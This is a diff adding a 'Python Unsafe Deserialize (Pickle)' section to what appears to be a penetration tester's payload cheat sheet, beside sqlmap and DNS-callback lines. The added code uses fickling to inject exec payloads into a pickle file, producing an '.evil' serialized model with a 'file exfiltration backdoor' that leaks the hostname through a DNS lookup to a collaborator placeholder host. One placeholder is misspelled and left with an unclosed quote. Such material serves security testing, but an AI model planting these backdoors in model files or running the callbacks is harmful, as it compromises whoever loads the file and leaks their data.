@@ -1907,6 +1907,37 @@ sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&param
 __import__("socket").gethostbyname("<collaborator_dns_name>")
 
 ##############################
+# Python Unsafe Deserialize ##
+# (Pickle)                  ##
+##############################
+from fickling.pickle import Pickled
+
+PAYLOAD = """exec("import os
+for file in os.listdir():
+  print(f'Exfiltrating {file}')
+")"""
+
+PAYLOAD2 = """exec("import socket
+hostname = socket.gethostname()
+collaborator = '<ollaborator_dns_name>
+callback = hostname + '.' + collaborator
+addr = socket.gethostbyname(callback)
+")"""
+
+with open("serialized_file.pik", "rb") as pickled_file:
+  pickled = Pickled.load(pickled_file)
+  print("Inserting file exfiltration backdoor into serialized model")
+  pickled.insert_python_exec(
+    PAYLOAD2, run_first=True, use_output_as_unpickle_result=False
+  )
+  with open("serialized_file.pik.evil", "wb") as evil_pickle_file:
+    try:
+      pickled.dump(evil_pickle_file)
+    except Exception as e:
+      print("Error writing evil file! ", e)
+
+
+##############################
 #### JS / XSS Payloads #######
 ##############################
 
